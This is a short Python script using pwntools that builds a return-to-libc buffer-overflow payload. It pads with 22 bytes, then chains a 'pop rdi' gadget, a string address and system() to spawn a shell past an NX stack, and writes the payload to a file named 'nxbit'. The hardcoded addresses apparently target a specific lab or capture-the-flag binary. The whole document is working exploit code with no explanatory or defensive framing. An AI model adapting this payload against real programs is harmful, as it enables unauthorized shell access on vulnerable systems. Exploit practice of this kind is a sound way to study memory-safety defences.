from struct import *
from pwn import *

base = 0x7ffff7dd7000
rdi_add = 0x004011bb
system = 0x7ffff7e20860
arg = 0x7ffff7f6f882
shellcode = asm(shellcraft.sh())
payload = b''
payload += b'A' * 22
payload += struct.pack('<Q', rdi_add)
payload += struct.pack('<Q', arg)
payload += struct.pack('<Q', system)

file = open("nxbit", "wb")
file.write(payload)